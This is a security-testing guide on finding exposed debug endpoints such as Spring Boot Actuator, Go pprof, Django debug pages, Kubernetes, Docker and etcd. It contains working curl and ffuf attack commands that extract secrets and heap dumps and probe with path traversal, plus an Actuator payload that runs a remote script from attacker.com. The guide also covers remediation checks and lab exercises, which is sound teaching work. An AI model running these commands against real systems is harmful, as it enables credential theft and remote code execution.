# Debug Endpoint Discovery Guide

> Companion to `skills/security-misconfiguration/SKILL.md`. This guide covers discovery of exposed debug endpoints, actuator interfaces, profiling tools, status pages, and stack trace leaks that reveal sensitive internal information.

---

## 1. Common Debug Endpoint Patterns

Applications frequently expose debug and monitoring endpoints that leak sensitive information. These are the primary targets:

```bash
# Spring Boot Actuator endpoints (Java)
ACTUATOR_PATHS=(
  "/actuator" "/actuator/env" "/actuator/health" "/actuator/info"
  "/actuator/beans" "/actuator/configprops" "/actuator/mappings"
  "/actuator/metrics" "/actuator/heapdump" "/actuator/threaddump"
  "/actuator/loggers" "/actuator/httptrace" "/actuator/scheduledtasks"
  "/actuator/conditions" "/actuator/shutdown"
)

# Django debug endpoints (Python)
DJANGO_PATHS=(
  "/__debug__/" "/__debug__/sql/" "/__debug__/templates/"
  "/admin/" "/silk/" "/silk/requests/"
  "/_debug_toolbar/" "/_debug_toolbar/render_panel/"
)

# Node.js/Express debug endpoints
NODE_PATHS=(
  "/debug" "/status" "/health" "/healthcheck" "/info"
  "/_profiler" "/metrics" "/prometheus"
  "/graphql" "/graphiql" "/playground"
  "/swagger" "/api-docs" "/swagger-ui"
)

# Generic debug/admin paths
GENERIC_PATHS=(
  "/debug" "/trace" "/status" "/server-status" "/server-info"
  "/phpinfo.php" "/info.php" "/test.php"
  "/elmah.axd" "/glimpse.axd" "/trace.axd"
  "/console" "/shell" "/repl"
  "/.env" "/config" "/configuration"
)
```

---

## 2. Automated Discovery with ffuf

Systematically scan for debug endpoints across targets:

```bash
# Create comprehensive debug endpoint wordlist
cat > debug_endpoints.txt << 'EOF'
actuator
actuator/env
actuator/health
actuator/heapdump
actuator/mappings
actuator/configprops
actuator/beans
actuator/threaddump
actuator/loggers
actuator/httptrace
__debug__
_debug_toolbar
debug
debug/vars
debug/pprof
debug/pprof/goroutine
debug/pprof/heap
debug/pprof/profile
status
server-status
server-info
info
health
healthcheck
metrics
prometheus/metrics
phpinfo.php
info.php
elmah.axd
trace.axd
console
graphiql
swagger-ui.html
api-docs
env
config
.env
EOF

# Scan single target
ffuf -u "https://target.com/FUZZ" \
  -w debug_endpoints.txt \
  -mc 200,301,302,401,403 \
  -o debug_scan.json \
  -t 20

# Scan multiple targets from subdomain enumeration
while read url; do
  echo "Scanning: $url"
  ffuf -u "${url}/FUZZ" \
    -w debug_endpoints.txt \
    -mc 200,301,302 \
    -t 10 -s | sed "s|^|${url}/|"
done < live_hosts.txt > all_debug_endpoints.txt
```

---

## 3. Spring Boot Actuator Exploitation

Spring Boot Actuator is one of the most commonly exposed debug interfaces:

```bash
# Check if actuator is exposed
curl -s "http://target:8080/actuator" | jq '.["_links"] | keys'

# Extract environment variables (may contain secrets)
curl -s "http://target:8080/actuator/env" | \
  jq '.propertySources[].properties | to_entries[] | 
  select(.key | test("password|secret|key|token|credential"; "i")) |
  {key: .key, value: .value.value}'

# Download heap dump (contains in-memory secrets, session tokens)
curl -s "http://target:8080/actuator/heapdump" -o heapdump.bin
# Analyze with Eclipse MAT or strings
strings heapdump.bin | grep -iE "password|secret|token|bearer" | sort -u | head -20

# View all mapped endpoints (reveals hidden API routes)
curl -s "http://target:8080/actuator/mappings" | \
  jq '.contexts[].mappings.dispatcherServlets[][] | .predicate' 2>/dev/null

# Modify log levels to enable debug logging
curl -X POST "http://target:8080/actuator/loggers/ROOT" \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel": "DEBUG"}'

# Check for remote code execution via env + restart
# If /actuator/env and /actuator/restart are both accessible:
curl -X POST "http://target:8080/actuator/env" \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.datasource.url","value":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\''http://attacker.com/payload.sql'\''"}' 
```

---

## 4. Go pprof Endpoint Discovery

Go applications often expose pprof profiling endpoints in production:

```bash
# Standard Go pprof paths
curl -s "http://target:6060/debug/pprof/" | grep -oP 'href="[^"]+"'

# Download goroutine dump (reveals internal state and code paths)
curl -s "http://target:6060/debug/pprof/goroutine?debug=2" > goroutines.txt
# Contains: function names, file paths, internal architecture

# Download heap profile (memory analysis)
curl -s "http://target:6060/debug/pprof/heap" -o heap.prof
go tool pprof -text heap.prof | head -30

# CPU profile (30-second capture)
curl -s "http://target:6060/debug/pprof/profile?seconds=5" -o cpu.prof
go tool pprof -text cpu.prof | head -30

# Extract source code paths from stack traces
grep -oP '/[a-zA-Z0-9/_\-]+\.go:\d+' goroutines.txt | sort -u
# Reveals: internal package structure, file organization, dependencies
```

---

## 5. Stack Trace and Error Leak Detection

Trigger error conditions to extract stack traces and internal information:

```bash
# Trigger errors with malformed input
# Invalid content type
curl -s -X POST "http://target/api/users" \
  -H "Content-Type: application/xml" \
  -d "<<<invalid>>>" 2>&1 | grep -A20 "Exception\|Traceback\|Error"

# Integer overflow / type confusion
curl -s "http://target/api/users/99999999999999999999" | \
  grep -iE "exception|stack|trace|error|at [a-z]"

# Path traversal to trigger file errors
curl -s "http://target/api/files/..%2f..%2f..%2fetc%2fpasswd" | \
  grep -iE "exception|filenotfound|ioerror|no such file"

# Null byte injection
curl -s "http://target/api/search?q=test%00" | \
  grep -iE "nullpointer|nil|none|exception"

# Extract useful information from stack traces
# - Internal IP addresses
# - File system paths
# - Database connection strings
# - Framework versions
# - Third-party library versions
curl -s "http://target/nonexistent" | \
  grep -oP '(?:at |File "|from )[^\s"]+' | sort -u > internal_paths.txt
```

---

## 6. Kubernetes and Container Debug Endpoints

Containerized environments expose additional debug surfaces:

```bash
# Kubernetes dashboard (often exposed without auth)
curl -sk "https://target:8443/api/v1/namespaces" | jq '.items[].metadata.name'

# kubelet read-only port (deprecated but still found)
curl -s "http://target:10255/pods" | jq '.items[].metadata.name'
curl -s "http://target:10255/metrics" | head -50

# Docker API (if exposed)
curl -s "http://target:2375/containers/json" | jq '.[].Names'
curl -s "http://target:2375/info" | jq '{Containers, Images, ServerVersion}'

# etcd (Kubernetes secrets store)
curl -s "http://target:2379/v2/keys/?recursive=true" | \
  jq '.node.nodes[].key'

# Prometheus metrics (reveals internal service topology)
curl -s "http://target:9090/api/v1/targets" | \
  jq '.data.activeTargets[] | {instance: .labels.instance, job: .labels.job}'

# Envoy admin interface
curl -s "http://target:15000/config_dump" | jq '.configs[].dynamic_listeners'
```

---

## 7. Automated Debug Endpoint Scanner

Comprehensive scanner that tests, validates, and categorizes findings:

```python
#!/usr/bin/env python3
"""Debug endpoint discovery scanner with severity classification."""

import subprocess
import json
from dataclasses import dataclass

@dataclass(frozen=True)
class DebugFinding:
    url: str
    endpoint_type: str
    severity: str
    data_exposed: str
    status_code: int

SEVERITY_MAP: dict[str, str] = {
    "actuator/heapdump": "CRITICAL",
    "actuator/env": "HIGH",
    "actuator/shutdown": "CRITICAL",
    "debug/pprof/heap": "HIGH",
    ".env": "CRITICAL",
    "phpinfo.php": "MEDIUM",
    "server-status": "LOW",
    "health": "INFO",
    "actuator/configprops": "HIGH",
    "actuator/mappings": "MEDIUM",
    "graphiql": "MEDIUM",
    "swagger-ui.html": "LOW",
}

def check_endpoint(base_url: str, path: str) -> DebugFinding | None:
    """Test a single debug endpoint and classify the finding."""
    url = f"{base_url.rstrip('/')}/{path}"
    result = subprocess.run(
        ["curl", "-sk", "-o", "/tmp/response.txt", "-w", "%{http_code}",
         "--max-time", "5", url],
        capture_output=True, text=True, timeout=10
    )
    status = int(result.stdout.strip()) if result.stdout.strip().isdigit() else 0
    if status in (200, 301, 302):
        severity = SEVERITY_MAP.get(path, "MEDIUM")
        return DebugFinding(
            url=url,
            endpoint_type=path,
            severity=severity,
            data_exposed=classify_exposure(path),
            status_code=status
        )
    return None

def classify_exposure(path: str) -> str:
    """Determine what type of data the endpoint exposes."""
    exposures = {
        "actuator/env": "Environment variables, potential secrets",
        "actuator/heapdump": "Full JVM memory including credentials",
        "debug/pprof": "Internal code paths and goroutine state",
        ".env": "Application secrets and configuration",
        "phpinfo.php": "PHP configuration, file paths, extensions",
        "server-status": "Active connections, client IPs, request URIs",
    }
    for key, description in exposures.items():
        if key in path:
            return description
    return "Internal application information"
```

---

## 8. Remediation Verification

After reporting debug endpoints, verify that fixes are properly applied:

```bash
# Verify actuator endpoints are properly secured
# Should return 401/403, not 200
for endpoint in env heapdump configprops mappings beans threaddump; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    "http://target:8080/actuator/$endpoint")
  if [ "$status" = "200" ]; then
    echo "[STILL EXPOSED] /actuator/$endpoint"
  elif [ "$status" = "401" ] || [ "$status" = "403" ]; then
    echo "[SECURED] /actuator/$endpoint → $status"
  elif [ "$status" = "404" ]; then
    echo "[REMOVED] /actuator/$endpoint → 404"
  fi
done

# Verify error pages don't leak stack traces
for payload in "/%00" "/nonexistent" "/api/users/AAAA"; do
  response=$(curl -sk "http://target${payload}")
  if echo "$response" | grep -qiE "exception|traceback|stack trace|at [a-z]"; then
    echo "[STILL LEAKING] ${payload} exposes stack trace"
  else
    echo "[FIXED] ${payload} returns generic error"
  fi
done

# Verify debug mode is disabled in production
curl -s "http://target/" -H "X-Debug: true" | \
  grep -c "debug\|trace\|profil" && echo "Debug headers still honored"
```

Debug endpoints are among the most impactful misconfigurations because they often provide direct access to secrets, internal architecture details, and sometimes even remote code execution capabilities — all without requiring any authentication.

---

## 9. Django Debug Mode Detection

Django applications with `DEBUG=True` expose detailed error pages, SQL queries, and local variables when an exception occurs:

```bash
# Trigger a 404 error and check for Django debug page
curl -s "https://target.com/nonexistent_path_debug_test/" | \
  grep -q "Django Debug Toolbar\|You're seeing this error because you have" && \
  echo "DJANGO DEBUG MODE ENABLED"

# Trigger a 500 error to leak more information
curl -s -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"invalid": "'"'"}' | \
  grep -iE "Traceback|Exception Type|Exception Value|Python Executable|Server time"

# Extract local variables from Django debug pages
curl -s "https://target.com/trigger_error/" | \
  grep -oP 'name="variables"[^>]*>.*?</pre>' | \
  sed 's/<[^>]*>//g' | head -50
```

**Django debug page information disclosed:**
- Full Python traceback with file paths
- Local variables at each stack frame (may contain secrets, database credentials)
- SQL queries executed during the request
- Request META headers (including server environment variables)
- Installed middleware and applications list
- Template debugging information

---

## 10. ASP.NET Debug Mode and Custom Errors

ASP.NET applications with `customErrors mode="Off"` or `debug="true"` expose detailed stack traces and framework version information:

```bash
# Check ASP.NET custom errors mode
curl -s "https://target.com/nonexistent_aspx_page.aspx" | \
  grep -iE "Runtime Error|Server Error|Stack Trace|Version Information"

# Trigger errors to detect debug mode
curl -s "https://target.com/api/values/abc" | \
  grep -iE "System\.|Exception|at [A-Z]" | head -20

# Check for Elmah error logging exposure
curl -s "https://target.com/elmah.axd" | head -50

# Check for Glimpse diagnostic tool
curl -s "https://target.com/glimpse.axd" | head -50
```

**ASP.NET web.config hardening:**

```xml
<system.web>
  <!-- Disable debug mode in production -->
  <compilation debug="false" />
  <!-- Enable custom errors -->
  <customErrors mode="On" defaultRedirect="/error.html">
    <error statusCode="404" redirect="/404.html" />
    <error statusCode="500" redirect="/500.html" />
  </customErrors>
  <!-- Hide version header -->
  <httpRuntime enableVersionHeader="false" />
</system.web>
```

---

## 11. Debug Endpoint Impact Classification

Not all debug endpoints carry the same risk. Use this classification to prioritize findings:

| Endpoint | Information Exposed | Severity | Exploitability |
|----------|-------------------|----------|----------------|
| `/actuator/heapdump` | Full JVM memory (credentials, tokens, keys) | CRITICAL | Immediate -- download and parse with strings/Eclipse MAT |
| `/actuator/env` | Environment variables (database URLs, API keys) | CRITICAL | Immediate -- credentials visible in plaintext |
| `/.env` | Application secrets, database credentials | CRITICAL | Immediate -- secrets in plaintext |
| `/actuator/configprops` | Configuration properties with decrypted values | HIGH | Moderate -- requires understanding of config keys |
| `/debug/pprof/heap` | Memory allocation data, internal code paths | HIGH | Moderate -- reveals architecture and dependencies |
| `/actuator/mappings` | All registered URL routes including hidden APIs | MEDIUM | Moderate -- enables targeted testing |
| `/phpinfo.php` | PHP version, extensions, configuration | MEDIUM | Low -- mostly useful for follow-up exploitation |
| `/swagger-ui.html` | API documentation with parameters and auth details | MEDIUM | Moderate -- enables targeted API testing |
| `/server-status` | Active connections, request URIs, client IPs | LOW | Low -- operational information only |
| `/health` | Application health status | INFO | Negligible -- no sensitive data |

---

## Hands-on Exercises

1. **Exercise 1**: Deploy a Spring Boot application with Actuator endpoints enabled. Use the techniques from this guide to discover all exposed endpoints, extract environment variables, and download the heap dump. Analyze the heap dump with `strings` to find embedded credentials
2. **Exercise 2**: Set up a Go web server with pprof enabled on port 6060. Download the goroutine dump and heap profile. Identify internal package names, file paths, and any secrets visible in memory
3. **Exercise 3**: Build a custom debug endpoint scanner that extends the Python scanner in Section 7 with Django, ASP.NET, and Node.js debug detection. Test it against a lab environment with intentionally exposed debug endpoints
4. **Exercise 4**: Configure a Spring Boot application to properly secure Actuator endpoints. Verify that only `/actuator/health` is accessible without authentication and that `/actuator/env`, `/actuator/heapdump`, and other sensitive endpoints return 401/403
